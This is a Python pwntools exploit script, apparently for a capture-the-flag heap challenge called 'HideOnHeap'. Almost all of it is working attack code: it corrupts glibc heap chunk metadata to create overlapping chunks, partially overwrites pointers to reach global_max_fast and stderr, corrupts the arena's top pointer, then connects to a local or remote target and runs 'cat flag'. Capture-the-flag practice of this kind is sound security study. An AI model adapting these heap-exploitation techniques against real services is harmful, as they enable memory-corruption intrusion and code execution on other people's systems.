# encoding: utf-8
from pwn import *

elf = None
libc = None
file_name = "./HideOnHeap"

# context.timeout = 1


def get_file(dic=""):
    context.binary = dic + file_name
    return context.binary


def get_libc(dic=""):
    if context.binary == None:
        context.binary = dic + file_name
    assert isinstance(context.binary, ELF)
    libc = None
    for lib in context.binary.libs:
        if '/libc.' in lib or '/libc-' in lib:
            libc = ELF(lib, checksec=False)
    return libc


def get_sh(Use_other_libc=False, Use_ssh=False):
    global libc
    if args['REMOTE']:
        if Use_other_libc:
            libc = ELF("./libc.so.6", checksec=False)
        if Use_ssh:
            s = ssh(sys.argv[3], sys.argv[1], int(sys.argv[2]), sys.argv[4])
            return s.process([file_name])
        else:
            if ":" in sys.argv[1]:
                r = sys.argv[1].split(':')
                return remote(r[0], int(r[1]))
            return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process([file_name])


def get_address(sh, libc=False, info=None, start_string=None, address_len=None, end_string=None, offset=None,
                int_mode=False):
    if start_string != None:
        sh.recvuntil(start_string)
    if libc == True:
        if info == None:
            info = 'libc_base:\t'
        return_address = u64(sh.recvuntil('\x7f')[-6:].ljust(8, '\x00'))
    elif int_mode:
        return_address = int(sh.recvuntil(end_string, drop=True), 16)
    elif address_len != None:
        return_address = u64(sh.recv()[:address_len].ljust(8, '\x00'))
    elif context.arch == 'amd64':
        return_address = u64(sh.recvuntil(end_string, drop=True).ljust(8, '\x00'))
    else:
        return_address = u32(sh.recvuntil(end_string, drop=True).ljust(4, '\x00'))
    if offset != None:
        return_address = return_address + offset
    if info != None:
        log.success(info + str(hex(return_address)))
    return return_address


def get_flag(sh):
    try:
        sh.recvrepeat(0.1)
        sh.sendline('cat flag')
        return sh.recvrepeat(0.3)
    except EOFError:
        return ""


def get_gdb(sh, addr=None, gdbscript=None, stop=False):
    if args['REMOTE']:
        return
    if gdbscript is not None:
        gdb.attach(sh, gdbscript)
    elif addr is not None:
        gdb.attach(sh, 'b *$rebase(' + hex(addr) + ")")
    else:
        gdb.attach(sh)
    if stop:
        pause()


def Attack(target=None, elf=None, libc=None):
    global sh
    if sh is None:
        from Class.Target import Target
        assert target is not None
        assert isinstance(target, Target)
        sh = target.sh
        elf = target.elf
        libc = target.libc
    assert isinstance(elf, ELF)
    assert isinstance(libc, ELF)
    try_count = 0
    while try_count < 32:
        try_count += 1
        try:
            pwn(sh, elf, libc)
            break
        except KeyboardInterrupt:
            break
        except EOFError:
            sh.close()
            if target is not None:
                sh = target.get_sh()
                target.sh = sh
                if target.connect_fail:
                    return 'ERROR : Can not connect to target server!'
            else:
                sh = get_sh()
    flag = get_flag(sh)
    return flag


def choice(idx):
    sh.sendlineafter("Choice:", str(idx))


def add(size):
    choice(1)
    sh.sendlineafter("Size:", str(size))


def edit(idx, content):
    choice(2)
    sh.sendlineafter("Index:", str(idx))
    sh.sendafter("Content:", str(content))


def delete(idx):
    choice(3)
    sh.sendlineafter("Index:", str(idx))


def pwn(sh, elf, libc):
    context.log_level = "debug"
    add(0x88)  # prev 0
    add(0x88)  # 1
    for i in range(7):
        add(0x88) #2 - 8

    add(0x3F0)  # 9
    add(0x3F0)  # 10

    for i in range(7):
        add(0x3F0) #11 - 17

    edit(2, '6' * 0x20 + '\x00' * 8 + p64(0x21))
    edit(13, '5' * 0x30 + '\x00' * 8 + p64(0x21) + '\x00' * 0x8 + p64(0x21) + '\x00' * 0x8 + p64(0x21))

    for i in range(2, 9):
        delete(i)
    delete(1)
    delete(0)
    add(0x88) #0
    delete(1)
    for i in range(7):
        add(0x88) #1 - 7
    add(0x118) #8 overlapping 1

    for i in range(11, 18):
        delete(i)
    delete(10)
    delete(9)
    add(0x3F0) #9
    delete(10)

    for i in range(7):
        add(0x3F0) #10-16
    add(0x3F0) #17
    add(0x3F0) #18 == 10

    for i in range(7):
         delete(1)
         edit(8, '\x00' * 0x88 + p64(0x91) + '\x00' * 0x10)

    for i in range(7):
         delete(10)
         edit(18, '\x00' * 0x10)

    delete(1)
    delete(10)

    add(0x58)  #1
    add(0x18) #10
    add(0x3D8) #19
    add(0x18) #20

    edit(8, '\x00' * 0x88 + p64(0x91) + '\x80\xdb')
    add(0x88)  # 21
    add(0x88)  # 22 global_max_fast

    edit(18, '\xc0\xb5')
    add(0x3F0)  # 23
    add(0x3F0)  # 24 stderr

    edit(22, '\xFF' * 8)  # change global_max_fast
    edit(8, '\x00' * 0x88 + p64(0x14C1))
    delete(21)
    edit(8, '\x00' * 0x88 + p64(0x14D1))
    delete(21)
    edit(8, '\x00' * 0x88 + p64(0x14E1))
    delete(21)

    #change main_arena->top
    for i in range(8):
        edit(8, '\x00' * 0x88 + p64(0xC1) + '\x00' * 0x10)
        delete(21)

    edit(24, p64(0xfbad1800) + '\x00' * 0x19)
    edit(22, p64(0x80))
    gdb.attach(sh)
    
    add(0x300)
    sh.interactive()


if __name__ == "__main__":
    sh = get_sh()
    flag = Attack(elf=get_file(), libc=get_libc())
    sh.close()
    if flag != "":
        log.success('The flag is ' + re.search(r'flag{.+}', flag).group())